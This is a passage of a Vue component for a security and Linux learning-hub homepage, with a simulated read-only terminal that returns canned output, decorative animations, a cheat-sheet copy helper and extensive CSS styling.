async function runScenes() {
  if (reduceMotion) {
    lines.value = scenes[0].lines.slice()
    return
  }
  while (alive) {
    lines.value = []
    for (const l of scenes[scene.value].lines) {
      if (!alive) return
      if (l.type === 'cmd') {
        typing.value = ''
        for (const ch of l.text) {
          if (!alive) return
          typing.value += ch
          await sleep(26 + Math.random() * 34)
        }
        await sleep(280)
        lines.value.push(l)
        typing.value = ''
      } else {
        await sleep(150)
        lines.value.push(l)
      }
    }
    await sleep(2600)
    scene.value = (scene.value + 1) % scenes.length
  }
}

/* ---------------- Matrix-style rain ---------------- */

let rainFrame = 0
function startRain() {
  const canvas = rain.value
  if (!canvas || reduceMotion) return
  const ctx = canvas.getContext('2d')
  const glyphs = '01abcdef{}[]<>/\\$#%=+*'.split('')
  let cols = []
  const size = 16
  const resize = () => {
    canvas.width = canvas.offsetWidth
    canvas.height = canvas.offsetHeight
    cols = Array.from({ length: Math.ceil(canvas.width / size) }, () => Math.random() * -40)
  }
  resize()
  window.addEventListener('resize', resize)
  let last = 0
  const draw = (t) => {
    if (!alive) return
    rainFrame = requestAnimationFrame(draw)
    if (t - last < 70) return
    last = t
    ctx.fillStyle = 'rgba(5, 10, 9, 0.12)'
    ctx.fillRect(0, 0, canvas.width, canvas.height)
    ctx.font = `${size - 2}px "JetBrains Mono", monospace`
    cols.forEach((y, i) => {
      const ch = glyphs[(Math.random() * glyphs.length) | 0]
      ctx.fillStyle = Math.random() > 0.96 ? 'rgba(167, 243, 208, 0.9)' : 'rgba(16, 185, 129, 0.55)'
      ctx.fillText(ch, i * size, y * size)
      cols[i] = y * size > canvas.height && Math.random() > 0.975 ? 0 : y + 1
    })
  }
  rainFrame = requestAnimationFrame(draw)
  stopRain = () => {
    cancelAnimationFrame(rainFrame)
    window.removeEventListener('resize', resize)
  }
}
let stopRain = () => {}

/* ---------------- Interactive terminal ---------------- */

const termInput = ref('')
const termLog = ref([
  { t: 'sys', x: 'Learning Hub shell v1.0 (simulated). Type "help" to see the commands.' },
])
const busy = ref(false)
const hist = []
let hi = 0

const files = {
  'README.md': [
    '# Learning Hub',
    'Practical lessons for Linux, Docker, networking and security.',
    'Start with the Linux track, then move on to Docker and hardening.',
  ],
  'notes.txt': [
    '- least privilege: give only the access that is needed',
    '- never expose the database port to the internet',
    '- read the logs before you guess',
  ],
  '/etc/os-release': ['PRETTY_NAME="Ubuntu 24.04 LTS"', 'NAME="Ubuntu"', 'VERSION_ID="24.04"'],
}

function print(x, t = 'out') {
  termLog.value.push({ t, x })
  nextTick(() => {
    if (termBody.value) termBody.value.scrollTop = termBody.value.scrollHeight
  })
}
function printAll(arr, t = 'out') {
  arr.forEach((x) => print(x, t))
}

async function run(cmdline) {
  const parts = cmdline.trim().split(/\s+/)
  const name = parts[0]
  const args = parts.slice(1)
  const flag = args.join(' ')

  switch (name) {
    case 'help':
      printAll([
        'Available commands:',
        '  whoami, id, pwd, hostname, date, uname -a, uptime',
        '  ls [-l], cat <file>, echo <text>, history, clear',
        '  ip a, ping <host>, nmap localhost, ss -tuln',
        '  docker ps | images | compose up -d',
        '  ufw status, systemctl status ssh, sudo <cmd>',
        '  free -h, df -h, neofetch, topics',
        'Files to try: README.md, notes.txt, /etc/os-release',
      ])
      break
    case 'whoami':
      print('tjmedina')
      break
    case 'id':
      print('uid=1000(tjmedina) gid=1000(tjmedina) groups=1000(tjmedina),27(sudo),999(docker)')
      break
    case 'pwd':
      print('/home/tjmedina/learning-hub')
      break
    case 'hostname':
      print('pi')
      break
    case 'date':
      print(new Date().toString())
      break
    case 'uptime':
      print(' up 12 days, 4:31,  1 user,  load average: 0.08, 0.04, 0.01')
      break
    case 'uname':
      print(flag.includes('a') ? 'Linux pi 6.6.31-rpi #1 SMP PREEMPT aarch64 GNU/Linux' : 'Linux')
      break
    case 'ls':
      if (flag.includes('l')) {
        printAll([
          'drwxr-xr-x 2 tjmedina tjmedina 4096 lessons',
          'drwxr-xr-x 2 tjmedina tjmedina 4096 labs',
          'drwxr-x--- 2 tjmedina tjmedina 4096 scripts',
          '-rw-r--r-- 1 tjmedina tjmedina  214 README.md',
          '-rw-r----- 1 tjmedina tjmedina   96 notes.txt',
        ])
      } else print('lessons/  labs/  scripts/  README.md  notes.txt')
      break
    case 'cat':
      if (!args[0]) print('cat: missing file operand', 'err')
      else if (files[args[0]]) printAll(files[args[0]])
      else print(`cat: ${args[0]}: No such file or directory`, 'err')
      break
    case 'echo':
      print(args.join(' '))
      break
    case 'history':
      hist.forEach((h, i) => print(`${String(i + 1).padStart(4)}  ${h}`))
      break
    case 'clear':
      termLog.value = []
      break
    case 'ip':
      printAll([
        '1: lo: <LOOPBACK,UP> mtu 65536',
        '    inet 127.0.0.1/8 scope host lo',
        '2: eth0: <BROADCAST,MULTICAST,UP> mtu 1500',
        '    inet 192.168.1.20/24 brd 192.168.1.255 scope global eth0',
        '3: docker0: <BROADCAST,MULTICAST,UP> mtu 1500',
        '    inet 172.17.0.1/16 scope global docker0',
      ])
      break
    case 'ss':
      printAll([
        'Netid State   Local Address:Port',
        'tcp   LISTEN  0.0.0.0:22',
        'tcp   LISTEN  0.0.0.0:443',
        'tcp   LISTEN  127.0.0.1:3306',
      ])
      break
    case 'ping': {
      const host = args.find((a) => !a.startsWith('-')) || 'localhost'
      print(`PING ${host} (192.168.1.20) 56(84) bytes of data.`)
      for (let i = 1; i <= 4; i++) {
        await sleep(520)
        print(
          `64 bytes from ${host}: icmp_seq=${i} ttl=64 time=${(0.3 + Math.random() * 0.4).toFixed(2)} ms`,
        )
      }
      await sleep(250)
      printAll(['--- ping statistics ---', '4 packets transmitted, 4 received, 0% packet loss'])
      break
    }
    case 'nmap': {
      print('Starting Nmap 7.94 ( https://nmap.org )')
      await sleep(900)
      printAll([
        'Nmap scan report for localhost (127.0.0.1)',
        'PORT     STATE SERVICE',
        '22/tcp   open  ssh',
        '443/tcp  open  https',
        '3306/tcp open  mysql',
        'Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds',
      ])
      print('Tip: only scan systems you own or are allowed to test.', 'warn')
      break
    }
    case 'docker':
      if (args[0] === 'ps') {
        printAll([
          'CONTAINER ID  IMAGE         STATUS               NAMES',
          'a1b2c3d4e5f6  nginx:stable  Up 2 hours            web',
          'b2c3d4e5f6a1  learninghub   Up 2 hours            api',
          'c3d4e5f6a1b2  mysql:8       Up 2 hours (healthy) db',
        ])
      } else if (args[0] === 'images') {
        printAll([
          'REPOSITORY   TAG      SIZE',
          'nginx        stable   188MB',
          'learninghub  latest   312MB',
          'mysql        8        591MB',
        ])
      } else if (args[0] === 'compose') {
        print('[+] Running 3/3', 'ok')
        await sleep(450)
        printAll(
          [
            ' âœ” Network learning-hub_default  Created',
            ' âœ” Container db   Healthy',
            ' âœ” Container api  Started',
            ' âœ” Container web  Started',
          ],
          'ok',
        )
      } else print('Usage: docker ps | images | compose up -d', 'warn')
      break
    case 'ufw':
      printAll([
        'Status: active',
        'To          Action  From',
        '22/tcp      ALLOW   Anywhere',
        '443/tcp     ALLOW   Anywhere',
        '3306/tcp    DENY    Anywhere',
      ])
      break
    case 'systemctl':
      printAll([
        'SSH ssh.service - OpenBSD Secure Shell server',
        '   Loaded: loaded (/lib/systemd/system/ssh.service; enabled)',
        '   Active: active (running) since Mon 2026-10-12 08:14:02',
      ])
      break
    case 'free':
      printAll([
        '       total   used   free',
        'Mem:   3.7Gi  1.1Gi  1.9Gi',
        'Swap:  1.0Gi  0.0Gi  1.0Gi',
      ])
      break
    case 'df':
      printAll([
        'Filesystem  Size  Used Avail Use% Mounted on',
        '/dev/mmcblk0p2 29G 7.4G 21G 27% /',
      ])
      break
    case 'neofetch':
      printAll([
        'tjmedina@pi',
        '-----------',
        'OS:      Ubuntu 24.04 LTS aarch64',
        'Kernel:  6.6.31-rpi',
        'Shell:   bash 5.2',
        'CPU:     Cortex-A76 (4)',
        'Memory:  1.1GiB / 3.7GiB',
        'Role:    learning-hub server',
      ])
      break
    case 'topics':
      areas.forEach((a) => print(`- ${a.title}${a.to ? '' : ' (soon)'}`))
      break
    case 'sudo':
      if (!args.length) print('usage: sudo <command>', 'warn')
      else await run(args.join(' '))
      break
    case 'rm':
      print('Nice try. This shell is read-only and perfectly safe.', 'warn')
      break
    case 'exit':
      print('You are already home. Keep exploring.', 'warn')
      break
    default:
      print(`bash: ${name}: command not found. Type "help".`, 'err')
  }
}

async function submitTerm() {
  const cmd = termInput.value.trim()
  termInput.value = ''
  print(cmd, 'cmd')
  if (!cmd) return
  hist.push(cmd)
  hi = hist.length
  busy.value = true
  try {
    await run(cmd)
  } finally {
    busy.value = false
    nextTick(() => termInputEl.value?.focus())
  }
}

function runQuick(c) {
  if (busy.value) return
  termInput.value = c
  submitTerm()
}

function histNav(dir) {
  if (!hist.length) return
  hi = Math.min(hist.length, Math.max(0, hi + dir))
  termInput.value = hist[hi] || ''
}

function focusTerm() {
  termInputEl.value?.focus({ preventScroll: true })
}

/* ---------------- Red / Blue chain ---------------- */

const stage = ref(0)
let chainTimer = null
function startChain() {
  clearInterval(chainTimer)
  if (reduceMotion) return
  chainTimer = setInterval(() => {
    stage.value = (stage.value + 1) % chain.length
  }, 5200)
}
function pickStage(i) {
  stage.value = i
  startChain()
}

/* ---------------- Cheat sheet ---------------- */

const cheatTab = ref('linux')
const copied = ref('')
async function copyCmd(cmd) {
  try {
    await navigator.clipboard.writeText(cmd)
  } catch {
    /* clipboard may be unavailable on insecure origins */
  }
  copied.value = cmd
  setTimeout(() => {
    if (copied.value === cmd) copied.value = ''
  }, 1400)
}

/* ---------------- Lifecycle ---------------- */

let observer = null

function loadFonts() {
  if (document.getElementById('hub-fonts')) return
  const link = document.createElement('link')
  link.id = 'hub-fonts'
  link.rel = 'stylesheet'
  link.href =
    'https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@500;600;700&family=IBM+Plex+Sans:wght@400;500;600&display=swap'
  document.head.appendChild(link)
}

onMounted(() => {
  loadFonts()
  checkApi()
  runScenes()
  startRain()
  startChain()

  const items = root.value?.$el?.querySelectorAll('.reveal') || []

  const show = (el) => {
    el.classList.add('in')
    if (el.hasAttribute('data-stats')) runCounters()
  }

  if (!('IntersectionObserver' in window)) {
    items.forEach(show)
    return
  }

  observer = new IntersectionObserver(
    (entries) => {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          show(entry.target)
          observer.unobserve(entry.target)
        }
      })
    },
    { threshold: 0.12 },
  )
  items.forEach((el) => observer.observe(el))
})

onBeforeUnmount(() => {
  alive = false
  clearInterval(chainTimer)
  stopRain()
  observer?.disconnect()
})
</script>

<style scoped>
.home {
  --primary: #10b981;
  --secondary: #34d399;
  --cyan: #22d3ee;
  --amber: #fbbf24;
  --red: #fb7185;
  --blue: #60a5fa;
  --bg: #050a09;
  --panel: #0a1412;
  --panel-2: #0e1c19;
  --ink: #e7f5ef;
  --muted: #8ba69c;
  --line: rgba(52, 211, 153, 0.14);
  --deep: #064e3b;
  --font-head: 'Space Grotesk', 'Segoe UI', system-ui, sans-serif;
  --font-body: 'IBM Plex Sans', 'Segoe UI', system-ui, sans-serif;
  --font-mono: 'JetBrains Mono', 'Cascadia Code', Consolas, monospace;
  background: var(--bg);
  color: var(--ink);
  min-height: 100vh;
  font-family: var(--font-body);
  overflow-x: clip;
}
.mono {
  font-family: var(--font-mono);
}
.home h1,
.home h2,
.home h3,
.home .stat-value,
.home .brand {
  font-family: var(--font-head);
}
.wrap {
  width: 100%;
  max-width: 1240px;
  margin: 0 auto;
  padding: 0 32px;
}
.section {
  padding: 104px 0;
  scroll-margin-top: 72px;
}
.section-alt {
  background: linear-gradient(180deg, #08110f, #0a1613);
  border-block: 1px solid var(--line);
}
#top {
  scroll-margin-top: 0;
}
:where(button, summary, input, a):focus-visible {
  outline: 2px solid var(--cyan);
  outline-offset: 3px;
}

/* reveal */
.reveal {
  opacity: 0;
}
.reveal.in {
  opacity: 1;
  animation: rise 0.6s cubic-bezier(0.2, 0.7, 0.2, 1) backwards;
  animation-delay: var(--d, 0ms);
}
@keyframes rise {
  from {
    opacity: 0;
    transform: translateY(18px);
  }
}

/* ---------- HERO ---------- */
.hero {
  position: relative;
  overflow: hidden;
  padding: 96px 0 88px;
  border-bottom: 1px solid var(--line);
}
.rain {
  position: absolute;
  inset: 0;
  width: 100%;
  height: 100%;
  opacity: 0.28;
  mask-image:
    linear-gradient(90deg, #000 0%, transparent 62%), linear-gradient(180deg, #000 60%, transparent);
  mask-composite: intersect;
  -webkit-mask-composite: source-in;
}
.hero-glow {
  position: absolute;
  inset: 0;
  pointer-events: none;
  background:
    radial-gradient(700px 420px at 88% 20%, rgba(34, 211, 238, 0.14), transparent 70%),
    radial-gradient(600px 360px at 10% 100%, rgba(16, 185, 129, 0.16), transparent 70%);
}
.hero-grid {
  position: relative;
  display: grid;
  grid-template-columns: 1fr 1.05fr;
  gap: 56px;
  align-items: center;
}
.pill {
  display: inline-flex;
  align-items: center;
  gap: 10px;
  padding: 7px 14px;
  border-radius: 999px;
  background: rgba(16, 185, 129, 0.08);
  border: 1px solid var(--line);
  color: var(--muted);
  font-size: 13px;
}
.pill .mono {
  color: var(--secondary);
  font-size: 12px;
}
.pill-sep {
  width: 1px;
  height: 12px;
  background: var(--line);
}
.pill-dot,
.status-dot {
  width: 8px;
  height: 8px;
  border-radius: 50%;
  background: var(--primary);
  box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.6);
  animation: ping 2s infinite;
}
.status-dot.off {
  background: var(--amber);
  animation: none;
  box-shadow: 0 0 0 4px rgba(251, 191, 36, 0.18);
}
@keyframes ping {
  70% {
    box-shadow: 0 0 0 9px rgba(16, 185, 129, 0);
  }
  100% {
    box-shadow: 0 0 0 0 rgba(16, 185, 129, 0);
  }
}
.hero h1 {
  margin: 26px 0 18px;
  font-size: clamp(52px, 7.4vw, 92px);
  line-height: 0.98;
  font-weight: 700;
  letter-spacing: -0.045em;
}
.h1-line {
  display: block;
}
.h1-hot {
  background: linear-gradient(100deg, var(--secondary), var(--cyan) 45%, var(--secondary) 90%);
  background-size: 220% 100%;
  -webkit-background-clip: text;
  background-clip: text;
  color: transparent;
  animation: sheen 5s linear infinite;
}
@keyframes sheen {
  to {
    background-position: -220% 0;
  }
}
.hero-sub {
  margin: 0 0 14px;
  font-family: var(--font-head);
  font-size: clamp(18px, 2vw, 22px);
  font-weight: 500;
  color: var(--ink);
}
.hero-desc {
  max-width: 540px;
  margin: 0;
  color: var(--muted);
  font-size: 16.5px;
  line-height: 1.75;
}
.hero-actions {
  display: flex;
  gap: 12px;
  margin-top: 34px;
  flex-wrap: wrap;
}
.btn-primary {
  background: var(--primary);
  color: #021410;
  border-radius: 12px;
  padding: 12px 22px;
  font-weight: 700;
  box-shadow:
    0 0 0 1px rgba(52, 211, 153, 0.5),
    0 10px 30px rgba(16, 185, 129, 0.28);
  transition:
    transform 0.15s,
    box-shadow 0.15s;
}
.btn-primary:hover {
  transform: translateY(-2px);
  box-shadow:
    0 0 0 1px var(--secondary),
    0 14px 38px rgba(16, 185, 129, 0.42);
}
.btn-ghost {
  color: var(--ink);
  border-radius: 12px;
  padding: 12px 22px;
  font-weight: 600;
  border-color: rgba(52, 211, 153, 0.3);
}
.btn-ghost:hover {
  background: rgba(16, 185, 129, 0.08);
}

/* terminals */
.visual {
  position: relative;
  padding: 18px 0 38px;
}
.terminal {
  border-radius: 16px;
  overflow: hidden;
  background: #040a08;
  border: 1px solid rgba(52, 211, 153, 0.28);
  box-shadow:
    0 0 0 1px rgba(0, 0, 0, 0.6),
    0 30px 70px rgba(0, 0, 0, 0.55),
    0 0 60px rgba(16, 185, 129, 0.1);
}
.terminal-bar {
  display: flex;
  align-items: center;
  gap: 7px;
  padding: 12px 16px;
  background: #0b1714;
  border-bottom: 1px solid var(--line);
}
.dot {
  width: 11px;
  height: 11px;
  border-radius: 50%;
}
.dot.r {
  background: #ff5f57;
}
.dot.y {
  background: #febc2e;
}
.dot.g {
  background: #28c840;
}
.terminal-bar em {
  margin-left: 10px;
  font-style: normal;
  font-size: 12px;
  color: #6f9487;
}
.scene-tabs {
  margin-left: auto;
  display: flex;
  gap: 5px;
}
.scene-tabs i {
  width: 16px;
  height: 3px;
  border-radius: 3px;
  background: #1c3a31;
  transition:
    background 0.3s,
    width 0.3s;
}
.scene-tabs i.on {
  width: 26px;
  background: var(--secondary);
}
.terminal-body {
  padding: 20px 22px 24px;
  font-size: 13.5px;
  line-height: 1.85;
  color: #9fb9af;
}
.terminal-hero .terminal-body {
  min-height: 372px;
}
.tl {
  white-space: pre-wrap;
  word-break: break-word;
}
.tl.cmd {
  color: #eafff6;
}
.tl b {
  color: var(--secondary);
  margin-right: 8px;
  font-weight: 500;
}
.tl.ok {
  color: #6fd8ad;
}
.tl.warn {
  color: var(--amber);
}
.tl.err {
  color: var(--red);
}
.tl.sys {
  color: var(--cyan);
}
.tl.out {
  animation: lineIn 0.25s ease-out;
}
.tl.ok,
.tl.warn {
  animation: lineIn 0.25s ease-out;
}
@keyframes lineIn {
  from {
    opacity: 0;
    transform: translateX(-6px);
  }
}
.cursor {
  display: inline-block;
  width: 8px;
  height: 15px;
  margin-left: 2px;
  vertical-align: -2px;
  background: var(--secondary);
  animation: blink 1.05s steps(1) infinite;
}
@keyframes blink {
  50% {
    opacity: 0;
  }
}
.chip {
  position: absolute;
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 10px 14px;
  border-radius: 14px;
  background: #0c1a16;
  border: 1px solid var(--line);
  box-shadow: 0 14px 34px rgba(0, 0, 0, 0.5);
  font-size: 13px;
  font-weight: 600;
  animation: float 5s ease-in-out infinite;
}
.chip-status {
  right: -14px;
  top: -6px;
}
.chip-nodes {
  left: -18px;
  bottom: 6px;
  gap: 0;
  animation-delay: -2.4s;
}
@keyframes float {
  50% {
    transform: translateY(-7px);
  }
}
.node {
  width: 34px;
  height: 34px;
  border-radius: 10px;
  display: grid;
  place-items: center;
  background: rgba(16, 185, 129, 0.12);
  color: var(--secondary);
}
.node + .node {
  margin-left: 22px;
  position: relative;
}
.node + .node::before {
  content: '';
  position: absolute;
  left: -22px;
  top: 50%;
  width: 22px;
  border-top: 2px dashed rgba(52, 211, 153, 0.5);
}

/* ---------- TICKER ---------- */
.ticker {
  overflow: hidden;
  border-bottom: 1px solid var(--line);
  background: #07100e;
  padding: 14px 0;
}
.ticker-track {
  display: flex;
  width: max-content;
  gap: 38px;
  animation: marquee 38s linear infinite;
  font-size: 13px;
  color: #5f8579;
}
.ticker-track span::before {
  content: '/';
  margin-right: 38px;
  color: rgba(52, 211, 153, 0.35);
}
@keyframes marquee {
  to {
    transform: translateX(-50%);
  }
}

/* ---------- STATS ---------- */
.stats {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  padding-block: 28px;
}
.stat {
  padding: 26px 24px;
  border-left: 1px solid var(--line);
}
.stat:first-child {
  border-left: 0;
}
.stat-value {
  font-size: 40px;
  font-weight: 700;
  letter-spacing: -0.03em;
  color: var(--ink);
  font-variant-numeric: tabular-nums;
}
.stat-label {
  margin-top: 4px;
  font-size: 14px;
  color: var(--muted);
}

/* ---------- SECTION HEAD ---------- */
.section-head {
  max-width: 680px;
  margin-bottom: 48px;
}
.section-head.tight {
  margin-bottom: 28px;
}
.section-head h2,
.cta h2,
.lab-copy h2 {
  margin: 0 0 12px;
  font-size: clamp(30px, 3.6vw, 44px);
  line-height: 1.08;
  font-weight: 700;
  letter-spacing: -0.035em;
}
.section-head p,
.lab-copy p {
  margin: 0;
  color: var(--muted);
  font-size: 17px;
  line-height: 1.7;
}

/* ---------- AREA CARDS ---------- */
.area-grid {
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  gap: 22px;
}
.area-card {
  --accent: var(--primary);
  --accent-ink: var(--secondary);
  --mx: 50%;
  --my: 0%;
  position: relative;
  display: flex;
  flex-direction: column;
  padding: 32px;
  border-radius: 18px;
  background: var(--panel);
  border: 1px solid var(--line);
  overflow: hidden;
  transition:
    transform 0.2s,
    border-color 0.2s;
}
.area-card::after {
  content: '';
  position: absolute;
  inset: 0;
  pointer-events: none;
  opacity: 0;
  background: radial-gradient(
    360px circle at var(--mx) var(--my),
    color-mix(in srgb, var(--accent) 16%, transparent),
    transparent 70%
  );
  transition: opacity 0.25s;
}
.area-card:hover::after {
  opacity: 1;
}
.accent-redblue {
  --accent: #fb7185;
  --accent-ink: #fda4af;
}
.accent-docker {
  --accent: #38a3f5;
  --accent-ink: #7cc4fb;
}
.accent-linux {
  --accent: #fbbf24;
  --accent-ink: #fcd34d;
}
.accent-networking {
  --accent: #22d3ee;
  --accent-ink: #67e8f9;
}
.accent-linux-services {
  --accent: #a78bfa;
  --accent-ink: #c4b5fd;
}
.accent-linux-hardening {
  --accent: #34d399;
  --accent-ink: #6ee7b7;
}
.accent-linux-monitoring {
  --accent: #2dd4bf;
  --accent-ink: #5eead4;
}
.area-card::before {
  content: '';
  position: absolute;
  left: 32px;
  right: 32px;
  top: 0;
  height: 2px;
  background: var(--accent);
  box-shadow: 0 0 18px var(--accent);
}
.area-card:hover {
  transform: translateY(-4px);
  border-color: color-mix(in srgb, var(--accent) 55%, transparent);
}
.area-card.soon {
  opacity: 0.8;
}
.area-card.soon::before {
  background: #2b4740;
  box-shadow: none;
}
.area-card.soon:hover {
  transform: none;
  border-color: var(--line);
}
.area-top {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 22px;
  position: relative;
  z-index: 1;
}
.area-icon {
  width: 54px;
  height: 54px;
  border-radius: 14px;
  display: grid;
  place-items: center;
  background: color-mix(in srgb, var(--accent) 14%, transparent);
  color: var(--accent-ink);
  transition: transform 0.2s;
}
.area-card:hover .area-icon {
  transform: translateY(-2px) rotate(-4deg) scale(1.06);
}
.soon .area-icon {
  background: #13221e;
  color: #5f8579;
}
.area-category {
  font-size: 13px;
  font-weight: 600;
  color: var(--accent-ink);
}
.badge {
  padding: 4px 11px;
  border-radius: 999px;
  background: #13221e;
  color: var(--muted);
  font-size: 12px;
  font-weight: 600;
}
.area-card h3 {
  position: relative;
  z-index: 1;
  margin: 0 0 8px;
  font-size: 24px;
  font-weight: 700;
  letter-spacing: -0.02em;
}
.area-card p {
  position: relative;
  z-index: 1;
  margin: 0;
  color: var(--muted);
  line-height: 1.65;
}
.area-cmd {
  position: relative;
  z-index: 1;
  margin-top: 18px;
  padding: 9px 13px;
  border-radius: 10px;
  background: #040a08;
  border: 1px solid var(--line);
  font-size: 13px;
  color: #cdeee1;
  overflow: hidden;
  white-space: nowrap;
  text-overflow: ellipsis;
}
.area-cmd b {
  color: var(--accent-ink);
  margin-right: 8px;
  font-weight: 500;
}
.topics {
  position: relative;
  z-index: 1;
  list-style: none;
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  margin: 18px 0 0;
  padding: 0;
}
.topics li {
  padding: 5px 12px;
  border-radius: 999px;
  background: rgba(255, 255, 255, 0.03);
  border: 1px solid var(--line);
  font-size: 13px;
  font-weight: 500;
  color: #a9c4b9;
}
.area-cta {
  position: relative;
  z-index: 1;
  margin-top: 26px;
  align-self: flex-start;
  border-radius: 12px;
  padding: 10px 20px;
  font-weight: 700;
  background: var(--accent);
  color: #04100c;
}
.area-cta :deep(.q-icon) {
  transition: transform 0.15s;
}
.area-cta:hover :deep(.q-icon) {
  transform: translateX(4px);
}

/* ---------- LIVE LAB ---------- */
.lab-grid {
  display: grid;
  grid-template-columns: 0.85fr 1.15fr;
  gap: 56px;
  align-items: center;
}
.lab-hint {
  margin-top: 16px !important;
  font-size: 15px !important;
}
.quick {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  margin: 16px 0 24px;
}
.quick-btn {
  padding: 7px 12px;
  border-radius: 9px;
  border: 1px solid var(--line);
  background: rgba(16, 185, 129, 0.07);
  color: #bfe9d9;
  font-size: 12.5px;
  cursor: pointer;
  transition:
    background 0.15s,
    border-color 0.15s,
    transform 0.15s;
}
.quick-btn:hover:not(:disabled) {
  background: rgba(16, 185, 129, 0.18);
  border-color: var(--secondary);
  transform: translateY(-1px);
}
.quick-btn:disabled {
  opacity: 0.45;
  cursor: wait;
}
.lab-list {
  list-style: none;
  margin: 0;
  padding: 0;
  display: grid;
  gap: 10px;
  color: var(--muted);
  font-size: 15px;
}
.lab-list li {
  display: flex;
  align-items: center;
  gap: 10px;
}
.lab-list .q-icon {
  color: var(--primary);
}
.lab-list code {
  padding: 1px 7px;
  border-radius: 6px;
  background: #0d1c18;
  color: var(--secondary);
  font-size: 13px;
}
.terminal-lab {
  cursor: text;
}
.lab-body {
  height: 440px;
  overflow-y: auto;
  scrollbar-width: thin;
  scrollbar-color: #1d3d33 transparent;
}
.input-row {
  display: flex;
  align-items: center;
}
.term-input {
  flex: 1;
  min-width: 0;
  background: transparent;
  border: 0;
  outline: 0;
  color: #eafff6;
  font-size: 13.5px;
  caret-color: var(--secondary);
}

/* ---------- NETWORK ---------- */
.net {
  padding: 28px;
  border-radius: 20px;
  background: var(--panel);
  border: 1px solid var(--line);
  background-image: radial-gradient(rgba(52, 211, 153, 0.1) 1px, transparent 1px);
  background-size: 24px 24px;
}
.net-svg {
  width: 100%;
  height: auto;
  display: block;
}
.net-lines use {
  fill: none;
  stroke: rgba(52, 211, 153, 0.35);
  stroke-width: 2;
  stroke-dasharray: 6 6;
  animation: dash 1.4s linear infinite;
}
@keyframes dash {
  to {
    stroke-dashoffset: -24;
  }
}
.net-node rect {
  fill: #0d1c18;
  stroke: rgba(52, 211, 153, 0.5);
  stroke-width: 1.5;
}
.net-node.fw rect {
  fill: rgba(251, 191, 36, 0.1);
  stroke: var(--amber);
}
.net-node.db rect {
  stroke: var(--cyan);
}
.net-node.bad rect {
  fill: rgba(251, 113, 133, 0.08);
  stroke: var(--red);
}
.net-svg text {
  text-anchor: middle;
  fill: var(--ink);
  font-family: var(--font-mono);
}
.nt {
  font-size: 14px;
  font-weight: 700;
}
.ns {
  font-size: 11.5px;
  fill: var(--muted) !important;
}
.ns.dim {
  opacity: 0.7;
}
.ns.bad-t {
  fill: var(--red) !important;
}
.pkt.ok {
  fill: var(--secondary);
  filter: drop-shadow(0 0 6px var(--secondary));
}
.pkt.evil {
  fill: var(--red);
  filter: drop-shadow(0 0 6px var(--red));
}
.net-legend {
  display: flex;
  flex-wrap: wrap;
  gap: 10px 28px;
  margin-top: 14px;
  color: var(--muted);
  font-size: 14px;
}
.net-legend span {
  display: inline-flex;
  align-items: center;
  gap: 9px;
}
.lg {
  width: 10px;
  height: 10px;
  border-radius: 50%;
}
.lg.ok {
  background: var(--secondary);
}
.lg.evil {
  background: var(--red);
}
.lg.db {
  background: var(--cyan);
}

/* ---------- KILL CHAIN ---------- */
.chain {
  display: grid;
  gap: 22px;
}
.chain-steps {
  position: relative;
  display: grid;
  grid-template-columns: repeat(5, 1fr);
  gap: 10px;
  padding-bottom: 14px;
}
.chain-step {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 14px 16px;
  border-radius: 12px;
  border: 1px solid var(--line);
  background: var(--panel);
  color: var(--muted);
  font: 600 14.5px var(--font-body);
  text-align: left;
  cursor: pointer;
  transition: all 0.2s;
}
.chain-step .mono {
  display: grid;
  place-items: center;
  width: 26px;
  height: 26px;
  border-radius: 8px;
  background: #11231e;
  font-size: 12px;
}
.chain-step.done {
  color: #b2cfc4;
}
.chain-step.on {
  color: var(--ink);
  border-color: var(--secondary);
  background: rgba(16, 185, 129, 0.1);
  box-shadow: 0 0 24px rgba(16, 185, 129, 0.15);
}
.chain-step.on .mono {
  background: var(--primary);
  color: #04100c;
}
.chain-bar {
  position: absolute;
  left: 0;
  right: 0;
  bottom: 0;
  height: 2px;
  background: #11231e;
  border-radius: 2px;
}
.chain-bar i {
  display: block;
  height: 100%;
  background: linear-gradient(90deg, var(--red), var(--blue));
  border-radius: 2px;
  transition: width 0.5s ease;
}
.chain-panels {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 22px;
}
.chain-panel {
  padding: 28px;
  border-radius: 18px;
  background: var(--panel);
  border: 1px solid var(--line);
  animation: swap 0.45s ease backwards;
}
@keyframes swap {
  from {
    opacity: 0;
    transform: translateY(10px);
  }
}
.chain-panel.red {
  border-color: rgba(251, 113, 133, 0.35);
  background: linear-gradient(160deg, rgba(251, 113, 133, 0.08), var(--panel) 60%);
}
.chain-panel.blue {
  border-color: rgba(96, 165, 250, 0.35);
  background: linear-gradient(160deg, rgba(96, 165, 250, 0.08), var(--panel) 60%);
}
.cp-head {
  display: flex;
  align-items: center;
  gap: 9px;
  font: 700 15px var(--font-head);
}
.red .cp-head {
  color: var(--red);
}
.blue .cp-head {
  color: var(--blue);
}
.chain-panel p {
  margin: 14px 0 18px;
  color: #b4cdc3;
  line-height: 1.7;
  min-height: 96px;
}
.cp-cmd {
  padding: 11px 14px;
  border-radius: 10px;
  background: #040a08;
  border: 1px solid var(--line);
  font-size: 13px;
  color: #eafff6;
  overflow-x: auto;
  white-space: nowrap;
}
.red .cp-cmd b {
  color: var(--red);
}
.blue .cp-cmd b {
  color: var(--blue);
}
.cp-cmd b {
  margin-right: 8px;
  font-weight: 500;
}

/* ---------- LAYERS + STACK ---------- */
.layers-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 64px;
  align-items: start;
}
.layers {
  list-style: none;
  margin: 0;
  padding: 0;
  display: grid;
  gap: 12px;
}
.layers li {
  display: flex;
  gap: 16px;
  padding: 16px 18px;
  border-radius: 14px;
  background: var(--panel);
  border: 1px solid var(--line);
  margin-left: calc(var(--i) * 14px);
  transition:
    transform 0.2s,
    border-color 0.2s;
}
.layers li:hover {
  transform: translateX(6px);
  border-color: var(--secondary);
}
